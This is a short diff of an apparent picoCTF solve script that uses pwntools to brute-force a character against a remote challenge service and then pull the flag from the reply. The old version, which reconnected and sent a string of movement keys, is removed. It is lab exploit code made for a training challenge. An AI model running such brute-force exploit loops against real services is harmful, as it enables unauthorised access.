@@ -22,13 +22,8 @@ for i in string.printable:
     recv = io.recvall()
     if b'picoCTF' in recv:
         print(f'Remote offset found as {i}')
-        offset = i 
+        output = recv.decode('utf-8')
+        list = output.split()
+        flag = list[-1]
+        print(f'The flag is {flag}')
         break
-
-print(offset)
-io = remote(f'{hostname}', f'{port}')
-io.sendline('l'+offset)
-io.sendline(b'w'*4)
-io.sendline(b'd'*47)
-io.sendline(b'wp')
-io.interactive()
